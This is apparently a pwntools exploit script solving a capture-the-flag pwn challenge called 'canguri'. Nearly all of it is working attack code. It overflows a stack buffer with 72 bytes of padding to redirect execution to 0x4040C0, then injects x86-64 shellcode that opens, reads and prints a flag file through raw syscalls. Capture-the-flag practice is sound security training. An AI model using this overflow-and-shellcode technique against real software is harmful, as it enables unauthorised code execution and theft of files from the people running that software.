from pwn import *

context.binary = elf = ELF('/home/mattia/Downloads/canguri/canguri')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    conn = remote('kangaroo.challs.olicyber.it', 20005)
elif args.GDB:
    conn = gdb.debug('/home/mattia/Downloads/canguri/canguri', '''
                  b *main+593
                  c
                  ''')
else:
    conn = process('./home/mattia/Downloads/canguri/canguri')
    
file_name_addr = next(elf.search(b'/home/problemuser/flag.txt')) #prendo la stringa dal binario e salvo l'indirizzo di essa
print(f'addr: {hex(file_name_addr)}')

payload = b'a' * 72 + p64(0x4040C0)

conn.sendlineafter(b'?\n', payload)

shellcode = asm(f'''
                mov rdi, {file_name_addr};  # open the file
                mov rsi, 0x0
                mov rax, 0x2               # syscall number for open
                syscall
                
                mov rdi, rax               # read file content
                mov rsi, 0x4040C0
                mov rdx, 0x20
                mov al, 0x0               # syscall: read
                syscall
                
                mov al, 0x1                # write to stdout
                mov rdi, 0x1               # file descriptor destinazione
                mov rsi, 0x4040C0
                mov rdx, 0x20
                syscall
                ''')

conn.sendlineafter(b'.\n', shellcode)

conn.interactive()
